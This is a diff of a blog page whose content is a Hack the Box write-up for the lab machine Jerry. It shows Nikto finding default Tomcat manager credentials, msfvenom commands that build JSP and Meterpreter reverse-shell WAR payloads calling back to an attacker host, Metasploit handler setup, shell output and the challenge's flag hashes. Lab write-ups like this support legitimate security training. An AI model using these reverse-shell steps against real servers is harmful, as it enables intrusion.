@@ -2,94 +2,86 @@
 |
 Hack the box - Jerry</title><meta charset=utf-8><meta name=generator content="Hugo 0.110.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=author content="Tobias Brixen"><meta name=description content="My contributions of un-finished ideas to the internet playground of co-creation"><link rel=stylesheet href=/scss/main.min.1147aa5bacb4bce677a0e264073829caedb82fd18ea07a5f1d80521f539d1c45.css integrity="sha256-EUeqW6y0vOZ3oOJkBzgpyu24L9GOoHpfHYBSH1OdHEU=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/css/markupHighlight.min.73ccfdf28df555e11009c13c20ced067af3cb021504cba43644c705930428b00.css integrity="sha256-c8z98o31VeEQCcE8IM7QZ688sCFQTLpDZExwWTBCiwA=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/fontawesome/css/fontawesome.min.7d272de35b410fb165377550cdf9c4d3a80fbbcc961e111914e4d5c0eaf5729f.css integrity="sha256-fSct41tBD7FlN3VQzfnE06gPu8yWHhEZFOTVwOr1cp8=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/fontawesome/css/solid.min.55d8333481b07a08e07cf6f37319753a2b47e99f4c395394c5747b48b495aa9b.css integrity="sha256-VdgzNIGwegjgfPbzcxl1OitH6Z9MOVOUxXR7SLSVqps=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/fontawesome/css/regular.min.a7448d02590b43449364b6b5922ed9af5410abb4de4238412a830316dedb850b.css integrity="sha256-p0SNAlkLQ0STZLa1ki7Zr1QQq7TeQjhBKoMDFt7bhQs=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/fontawesome/css/brands.min.9ed75a5d670c953fe4df935937674b4646f92674367e9e66eb995bb04e821647.css integrity="sha256-ntdaXWcMlT/k35NZN2dLRkb5JnQ2fp5m65lbsE6CFkc=" crossorigin=anonymous type=text/css><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=canonical href=https://tbrixen.github.io/posts/htb-jerry/><script type=text/javascript src=/js/anatole-header.min.f9132794301a01ff16550ed66763482bd848f62243d278f5e550229a158bfd32.js integrity="sha256-+RMnlDAaAf8WVQ7WZ2NIK9hI9iJD0nj15VAimhWL/TI=" crossorigin=anonymous></script>
 <script type=text/javascript src=/js/anatole-theme-switcher.min.d6d329d93844b162e8bed1e915619625ca91687952177552b9b3e211014a2957.js integrity="sha256-1tMp2ThEsWLovtHpFWGWJcqRaHlSF3VSubPiEQFKKVc=" crossorigin=anonymous></script>
-<script async defer src=https://analytics.umami.is/script.js data-website-id=b1c6be44-f1ef-4886-862e-f468d2b074be></script><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack the box - Jerry"><meta name=twitter:description content="Jerry This is my writeup of the Hack the Box machine Jerry.
-I used Nikto for enumeration and msfvenom to get a reverse shell. The revere shell was unstable, so I used Meterpreter to get a more reliable foothold.
-Enumeration The nmap scan showed a Tomcat instance, remote desktop port (3389) among other open ports.
-I had no luck in getting access to the remote desktop port.
-And unfortunately, the Tomcat required credentials."><meta property="og:title" content="Hack the box - Jerry"><meta property="og:description" content="Jerry This is my writeup of the Hack the Box machine Jerry.
-I used Nikto for enumeration and msfvenom to get a reverse shell. The revere shell was unstable, so I used Meterpreter to get a more reliable foothold.
-Enumeration The nmap scan showed a Tomcat instance, remote desktop port (3389) among other open ports.
-I had no luck in getting access to the remote desktop port.
-And unfortunately, the Tomcat required credentials."><meta property="og:type" content="article"><meta property="og:url" content="https://tbrixen.github.io/posts/htb-jerry/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-07-18T20:08:47+02:00"><meta property="article:modified_time" content="2018-07-18T20:08:47+02:00"><meta property="og:site_name" content="tbrixen"><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","articleSection":"posts","name":"Hack the box - Jerry","headline":"Hack the box - Jerry","alternativeHeadline":"","description":"
+<script async defer src=https://analytics.umami.is/script.js data-website-id=b1c6be44-f1ef-4886-862e-f468d2b074be></script><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack the box - Jerry"><meta name=twitter:description content="This is my writeup of the Hack the Box machine Jerry."><meta property="og:title" content="Hack the box - Jerry"><meta property="og:description" content="This is my writeup of the Hack the Box machine Jerry."><meta property="og:type" content="article"><meta property="og:url" content="https://tbrixen.github.io/posts/htb-jerry/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-07-18T20:08:47+02:00"><meta property="article:modified_time" content="2018-07-18T20:08:47+02:00"><meta property="og:site_name" content="tbrixen"><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","articleSection":"posts","name":"Hack the box - Jerry","headline":"Hack the box - Jerry","alternativeHeadline":"","description":"
       
-        Jerry This is my writeup of the Hack the Box machine Jerry.\nI used Nikto for enumeration and msfvenom to get a reverse shell. The revere shell was unstable, so I used Meterpreter to get a more reliable foothold.\nEnumeration The nmap scan showed a Tomcat instance, remote desktop port (3389) among other open ports.\nI had no luck in getting access to the remote desktop port.\nAnd unfortunately, the Tomcat required credentials.
+        This is my writeup of the Hack the Box machine Jerry.
 
 
       
 
 
-    ","inLanguage":"en-us","isFamilyFriendly":"true","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/tbrixen.github.io\/posts\/htb-jerry\/"},"author":{"@type":"Person","name":"Tobias Brixen"},"creator":{"@type":"Person","name":"Tobias Brixen"},"accountablePerson":{"@type":"Person","name":"Tobias Brixen"},"copyrightHolder":{"@type":"Person","name":"Tobias Brixen"},"copyrightYear":"2018","dateCreated":"2018-07-18T20:08:47.00Z","datePublished":"2018-07-18T20:08:47.00Z","dateModified":"2018-07-18T20:08:47.00Z","publisher":{"@type":"Organization","name":"Tobias Brixen","url":"https://tbrixen.github.io/","logo":{"@type":"ImageObject","url":"https:\/\/tbrixen.github.io\/favicon-32x32.png","width":"32","height":"32"}},"image":[],"url":"https:\/\/tbrixen.github.io\/posts\/htb-jerry\/","wordCount":"545","genre":[],"keywords":[]}</script></head><body class=body><div class=wrapper><aside class=wrapper__sidebar><div class="sidebar
+    ","inLanguage":"en-us","isFamilyFriendly":"true","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/tbrixen.github.io\/posts\/htb-jerry\/"},"author":{"@type":"Person","name":"Tobias Brixen"},"creator":{"@type":"Person","name":"Tobias Brixen"},"accountablePerson":{"@type":"Person","name":"Tobias Brixen"},"copyrightHolder":{"@type":"Person","name":"Tobias Brixen"},"copyrightYear":"2018","dateCreated":"2018-07-18T20:08:47.00Z","datePublished":"2018-07-18T20:08:47.00Z","dateModified":"2018-07-18T20:08:47.00Z","publisher":{"@type":"Organization","name":"Tobias Brixen","url":"https://tbrixen.github.io/","logo":{"@type":"ImageObject","url":"https:\/\/tbrixen.github.io\/favicon-32x32.png","width":"32","height":"32"}},"image":[],"url":"https:\/\/tbrixen.github.io\/posts\/htb-jerry\/","wordCount":"544","genre":[],"keywords":[]}</script></head><body class=body><div class=wrapper><aside class=wrapper__sidebar><div class="sidebar
 animated fadeInDown"><div class=sidebar__content><div class=sidebar__introduction><img class=sidebar__introduction-profileimage src=/images/profile.png alt="profile picture"><div class=sidebar__introduction-title><a href=/>tbrixen</a></div><div class=sidebar__introduction-description><p>My contributions of un-finished ideas to the internet playground of co-creation</p></div></div><ul class=sidebar__list><li class=sidebar__list-item><a href=http://github.com/tbrixen target=_blank rel="noopener me" aria-label=Github title=Github><i class="fab fa-github fa-2x" aria-hidden=true></i></a></li><li class=sidebar__list-item><a href=https://dk.linkedin.com/in/tbrixen target=_blank rel="noopener me" aria-label=Linkedin title=Linkedin><i class="fab fa-linkedin fa-2x" aria-hidden=true></i></a></li></ul></div><footer class="footer footer__sidebar"><ul class=footer__list><li class=footer__item>&copy;
 Tobias Brixen
 2023</li></ul></footer><script type=text/javascript src=/js/medium-zoom.min.1248fa75275e5ef0cbef27e8c1e27dc507c445ae3a2c7d2ed0be0809555dac64.js integrity="sha256-Ekj6dSdeXvDL7yfoweJ9xQfERa46LH0u0L4ICVVdrGQ=" crossorigin=anonymous></script></div></aside><main class=wrapper__main><header class=header><div class="animated fadeInDown"><a role=button class=navbar-burger data-target=navMenu aria-label=menu aria-expanded=false><span aria-hidden=true class=navbar-burger__line></span>
 <span aria-hidden=true class=navbar-burger__line></span>
 <span aria-hidden=true class=navbar-burger__line></span></a><nav class=nav><ul class=nav__list id=navMenu></ul><ul class="nav__list nav__list--end"><li class=nav__list-item><div class=themeswitch><a title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></li></ul></nav></div></header><div class="post
-animated fadeInDown"><div class=post__content><h1>Hack the Box - Jerry</h1><h1 id=jerry>Jerry</h1><p>This is my writeup of the Hack the Box machine <a href=https://www.hackthebox.com/machines/jerry>Jerry</a>.</p><p>I used Nikto for enumeration and <code>msfvenom</code> to get a reverse shell. The revere shell was unstable, so I used Meterpreter to get a more reliable foothold.</p><h2 id=enumeration>Enumeration</h2><p>The <a href=nmap_scan.txt>nmap scan</a> showed a Tomcat instance, remote desktop port (3389) among other open ports.</p><p>I had no luck in getting access to the remote desktop port.</p><p>And unfortunately, the Tomcat required credentials.</p><p>The version was 7.0.88 of which there existed an exploit for privilege escalation, but this only local, not remote.</p><p>Since this was a web-server, maybe Nikto could help.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>trickmask@kali:~$ nikto -h 10.10.10.95:8080
-</span></span><span style=display:flex><span>- Nikto v2.1.6
-</span></span><span style=display:flex><span>---------------------------------------------------------------------------
-</span></span><span style=display:flex><span>+ Target IP:          10.10.10.95
-</span></span><span style=display:flex><span>+ Target Hostname:    10.10.10.95
-</span></span><span style=display:flex><span>+ Target Port:        <span style=color:#ae81ff>8080</span>
-</span></span><span style=display:flex><span>+ Start Time:         2018-07-17 20:03:53 <span style=color:#f92672>(</span>GMT2<span style=color:#f92672>)</span>
-</span></span><span style=display:flex><span>---------------------------------------------------------------------------
-</span></span><span style=display:flex><span>+ Server: Apache-Coyote/1.1
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
-</span></span><span style=display:flex><span>+ OSVDB-3233: /a/: May be Kebi Web Mail administration menu.
-</span></span><span style=display:flex><span>+ Default account found <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;Tomcat Manager Application&#39;</span> at /manager/html <span style=color:#f92672>(</span>ID <span style=color:#e6db74>&#39;tomcat&#39;</span>, PW <span style=color:#e6db74>&#39;s3cret&#39;</span><span style=color:#f92672>)</span>. Apache Tomcat.
-</span></span><span style=display:flex><span>+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
-</span></span><span style=display:flex><span>+ /manager/html: Tomcat Manager / Host Manager interface found <span style=color:#f92672>(</span>pass protected<span style=color:#f92672>)</span>
-</span></span><span style=display:flex><span>+ /manager/status: Tomcat Server Status interface found <span style=color:#f92672>(</span>pass protected<span style=color:#f92672>)</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
-</span></span></code></pre></div><p>It found something on the <code>/a/</code> endpoint. Opening it up only displayed an empty page.</p><p>It found <code>Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret')</code>. Score!</p><p>This gave access to uploading/deploying <code>.war</code> files from <a href=http://10.10.10.95:8080/manager/html>http://10.10.10.95:8080/manager/html</a>.</p><h2 id=exploit>Exploit</h2><p>How to get reverse shell? This is a Windows box, so we don&rsquo;t have the <code>nc</code> utility.</p><p>I ended up using Metasploit to generate a reverse-shell to my machine.</p><p>I got the generation script from the archive at <a href="http://netsec.ws/?p=331">http://netsec.ws/?p=331</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ msfvenom -p java/jsp_shell_reverse_tcp <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>LHOST<span style=color:#f92672>=</span>10.10.XX.XX <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>44332</span> <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-f war <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-o shell.war
+animated fadeInDown"><div class=post__content><h1>Hack the Box - Jerry</h1><p>This is my writeup of the Hack the Box machine <a href=https://www.hackthebox.com/machines/jerry>Jerry</a>.</p><p>I used Nikto for enumeration and <code>msfvenom</code> to get a reverse shell. The revere shell was unstable, so I used Meterpreter to get a more reliable foothold.</p><h2 id=enumeration>Enumeration</h2><p>The <a href=nmap_scan.txt>nmap scan</a> showed a Tomcat instance, remote desktop port (3389) among other open ports.</p><p>I had no luck in getting access to the remote desktop port.</p><p>And unfortunately, the Tomcat required credentials.</p><p>The version was 7.0.88 of which there existed an exploit for privilege escalation, but this only local, not remote.</p><p>Since this was a web-server, maybe Nikto could help.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>trickmask@kali:~$ nikto -h 10.10.10.95:8080
+</span></span><span class=line><span class=cl>- Nikto v2.1.6
+</span></span><span class=line><span class=cl>---------------------------------------------------------------------------
+</span></span><span class=line><span class=cl>+ Target IP:          10.10.10.95
+</span></span><span class=line><span class=cl>+ Target Hostname:    10.10.10.95
+</span></span><span class=line><span class=cl>+ Target Port:        <span class=m>8080</span>
+</span></span><span class=line><span class=cl>+ Start Time:         2018-07-17 20:03:53 <span class=o>(</span>GMT2<span class=o>)</span>
+</span></span><span class=line><span class=cl>---------------------------------------------------------------------------
+</span></span><span class=line><span class=cl>+ Server: Apache-Coyote/1.1
+</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
+</span></span><span class=line><span class=cl>+ OSVDB-3233: /a/: May be Kebi Web Mail administration menu.
+</span></span><span class=line><span class=cl>+ Default account found <span class=k>for</span> <span class=s1>&#39;Tomcat Manager Application&#39;</span> at /manager/html <span class=o>(</span>ID <span class=s1>&#39;tomcat&#39;</span>, PW <span class=s1>&#39;s3cret&#39;</span><span class=o>)</span>. Apache Tomcat.
+</span></span><span class=line><span class=cl>+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+</span></span><span class=line><span class=cl>+ /manager/html: Tomcat Manager / Host Manager interface found <span class=o>(</span>pass protected<span class=o>)</span>
+</span></span><span class=line><span class=cl>+ /manager/status: Tomcat Server Status interface found <span class=o>(</span>pass protected<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>snip<span class=o>]</span>
+</span></span></code></pre></div><p>It found something on the <code>/a/</code> endpoint. Opening it up only displayed an empty page.</p><p>It found <code>Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret')</code>. Score!</p><p>This gave access to uploading/deploying <code>.war</code> files from <a href=http://10.10.10.95:8080/manager/html>http://10.10.10.95:8080/manager/html</a>.</p><h2 id=exploit>Exploit</h2><p>How to get reverse shell? This is a Windows box, so we don&rsquo;t have the <code>nc</code> utility.</p><p>I ended up using Metasploit to generate a reverse-shell to my machine.</p><p>I got the generation script from the archive at <a href="http://netsec.ws/?p=331">http://netsec.ws/?p=331</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ msfvenom -p java/jsp_shell_reverse_tcp <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=nv>LHOST</span><span class=o>=</span>10.10.XX.XX <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=nv>LPORT</span><span class=o>=</span><span class=m>44332</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-f war <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-o shell.war
 </span></span></code></pre></div><p>I deployed <code>shell.war</code> in Tomcat, opened a listening socket on my machine <code>nc -lvp 44332</code>, and then activated the exploit by visiting the application at <a href=http://10.10.10.95:8080/shell/>http://10.10.10.95:8080/shell/</a>, and it connected back!
-I found the flags on the desktop.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-batchfile data-lang=batchfile><span style=display:flex><span>trickmask@kali:~/Desktop$ nc -lvp 44332
-</span></span><span style=display:flex><span>listening on [any] 44332 ...
-</span></span><span style=display:flex><span>10.10.10.95: inverse host lookup failed: Unknown host
-</span></span><span style=display:flex><span>connect to [10.10.14.234] from (UNKNOWN) [10.10.10.95] 49264
-</span></span><span style=display:flex><span>Microsoft Windows [Version 6.3.9600]
-</span></span><span style=display:flex><span>(c) 2013 Microsoft Corporation. All rights reserved.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>C:\apache-tomcat-7.0.88<span style=color:#75715e>&gt;type &#34;C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt&#34;</span>
-</span></span><span style=display:flex><span>user.txt
-</span></span><span style=display:flex><span>7004dbcef0f854e0fb401875f26ebd00
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>root.txt
-</span></span><span style=display:flex><span>04a8b36e1545a455393d067e772fe90e
-</span></span><span style=display:flex><span>C:\apache-tomcat-7.0.88<span style=color:#75715e>&gt;</span>
-</span></span></code></pre></div><h2 id=exploit-using-metepreter-payload>Exploit using Metepreter payload</h2><p>Annoyingly the shell was rather unstable. Somewhat randomly it dropped the connection (mostly after I mistyped something). I&rsquo;ve heard about Metepreter before, and wanted to try that out.</p><p>Using <code>msfvenom --list | grep meterpreter</code> I could find the payload I could use: <code>windows/x64/meterpreter_reverse_tcp</code>.</p><p>I generated the reverse shell <code>.war</code> file:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ msfvenom <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-p windows/x64/meterpreter_reverse_tcp  <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>LHOST<span style=color:#f92672>=</span>10.10.XX.XX <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>44332</span> <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-f war <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>-o meterpreter.war <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--platform windows <span style=color:#ae81ff>\
-</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>--arch x64
-</span></span></code></pre></div><p>And deployed <code>meterpreter.war</code> in Tomcat.</p><p>Set up the handler (in <code>msfconsole</code>)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msf &gt; use exploit/multi/handler
-</span></span><span style=display:flex><span>msf &gt; set payload windows/x64/meterpreter_reverse_tcp
-</span></span><span style=display:flex><span>msf &gt; set LHOST 10.10.15.234
-</span></span><span style=display:flex><span>msf &gt; set LPORT <span style=color:#ae81ff>44332</span>
-</span></span><span style=display:flex><span>msf &gt; exploit
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.14.234:44332
-</span></span></code></pre></div><p>Activated exploit by visiting <a href=http://10.10.10.95:8080/meterpreter/>http://10.10.10.95:8080/meterpreter/</a>, and watched as I get a Meterpreter session from which I could launch a shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-batchfile data-lang=batchfile><span style=display:flex><span>[*] Meterpreter session 4 opened (10.10.14.234:44332 -&gt; 10.10.10.95:49278) at 2018-07-18 16:22:48 +0200
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>meterpreter &gt; shell
-</span></span><span style=display:flex><span>Process 2908 created.
-</span></span><span style=display:flex><span>Channel 1 created.
-</span></span><span style=display:flex><span>Microsoft Windows [Version 6.3.9600]
-</span></span><span style=display:flex><span>(c) 2013 Microsoft Corporation. All rights reserved.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>C:\apache-tomcat-7.0.88<span style=color:#75715e>&gt;type &#34;C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt&#34;</span>
-</span></span><span style=display:flex><span>user.txt
-</span></span><span style=display:flex><span>7004dbcef0f854e0fb401875f26ebd00
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>root.txt
-</span></span><span style=display:flex><span>04a8b36e1545a455393d067e772fe90e
-</span></span><span style=display:flex><span>C:\apache-tomcat-7.0.88<span style=color:#75715e>&gt;</span>
+I found the flags on the desktop.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-batchfile data-lang=batchfile><span class=line><span class=cl>trickmask@kali:~/Desktop$ nc -lvp 44332
+</span></span><span class=line><span class=cl>listening on [any] 44332 ...
+</span></span><span class=line><span class=cl>10.10.10.95: inverse host lookup failed: Unknown host
+</span></span><span class=line><span class=cl>connect to [10.10.14.234] from (UNKNOWN) [10.10.10.95] 49264
+</span></span><span class=line><span class=cl>Microsoft Windows [Version 6.3.9600]
+</span></span><span class=line><span class=cl><span class=p>(</span>c<span class=p>)</span> 2013 Microsoft Corporation. All rights reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\apache-tomcat-7.0.88</span><span class=c1>&gt;type &#34;C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt&#34;</span>
+</span></span><span class=line><span class=cl>user.txt
+</span></span><span class=line><span class=cl>7004dbcef0f854e0fb401875f26ebd00
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>root.txt
+</span></span><span class=line><span class=cl>04a8b36e1545a455393d067e772fe90e
+</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\apache-tomcat-7.0.88</span><span class=c1>&gt;</span>
+</span></span></code></pre></div><h2 id=exploit-using-metepreter-payload>Exploit using Metepreter payload</h2><p>Annoyingly the shell was rather unstable. Somewhat randomly it dropped the connection (mostly after I mistyped something). I&rsquo;ve heard about Metepreter before, and wanted to try that out.</p><p>Using <code>msfvenom --list | grep meterpreter</code> I could find the payload I could use: <code>windows/x64/meterpreter_reverse_tcp</code>.</p><p>I generated the reverse shell <code>.war</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ msfvenom <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-p windows/x64/meterpreter_reverse_tcp  <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=nv>LHOST</span><span class=o>=</span>10.10.XX.XX <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span><span class=nv>LPORT</span><span class=o>=</span><span class=m>44332</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-f war <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-o meterpreter.war <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>--platform windows <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>--arch x64
+</span></span></code></pre></div><p>And deployed <code>meterpreter.war</code> in Tomcat.</p><p>Set up the handler (in <code>msfconsole</code>)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>msf &gt; use exploit/multi/handler
+</span></span><span class=line><span class=cl>msf &gt; <span class=nb>set</span> payload windows/x64/meterpreter_reverse_tcp
+</span></span><span class=line><span class=cl>msf &gt; <span class=nb>set</span> LHOST 10.10.15.234
+</span></span><span class=line><span class=cl>msf &gt; <span class=nb>set</span> LPORT <span class=m>44332</span>
+</span></span><span class=line><span class=cl>msf &gt; exploit
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.234:44332
+</span></span></code></pre></div><p>Activated exploit by visiting <a href=http://10.10.10.95:8080/meterpreter/>http://10.10.10.95:8080/meterpreter/</a>, and watched as I get a Meterpreter session from which I could launch a shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-batchfile data-lang=batchfile><span class=line><span class=cl>[*] Meterpreter session 4 opened (10.10.14.234:44332 -<span class=p>&gt;</span> 10.10.10.95:49278) at 2018-07-18 16:22:48 +0200
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>meterpreter <span class=p>&gt;</span> shell
+</span></span><span class=line><span class=cl>Process 2908 created.
+</span></span><span class=line><span class=cl>Channel 1 created.
+</span></span><span class=line><span class=cl>Microsoft Windows [Version 6.3.9600]
+</span></span><span class=line><span class=cl><span class=p>(</span>c<span class=p>)</span> 2013 Microsoft Corporation. All rights reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\apache-tomcat-7.0.88</span><span class=c1>&gt;type &#34;C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt&#34;</span>
+</span></span><span class=line><span class=cl>user.txt
+</span></span><span class=line><span class=cl>7004dbcef0f854e0fb401875f26ebd00
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>root.txt
+</span></span><span class=line><span class=cl>04a8b36e1545a455393d067e772fe90e
+</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\apache-tomcat-7.0.88</span><span class=c1>&gt;</span>
 </span></span></code></pre></div></div><div class=post__footer></div></div></main></div><footer class="footer footer__base"><ul class=footer__list><li class=footer__item>&copy;
 Tobias Brixen
 2023</li></ul></footer><script type=text/javascript src=/js/medium-zoom.min.1248fa75275e5ef0cbef27e8c1e27dc507c445ae3a2c7d2ed0be0809555dac64.js integrity="sha256-Ekj6dSdeXvDL7yfoweJ9xQfERa46LH0u0L4ICVVdrGQ=" crossorigin=anonymous></script></body></html>
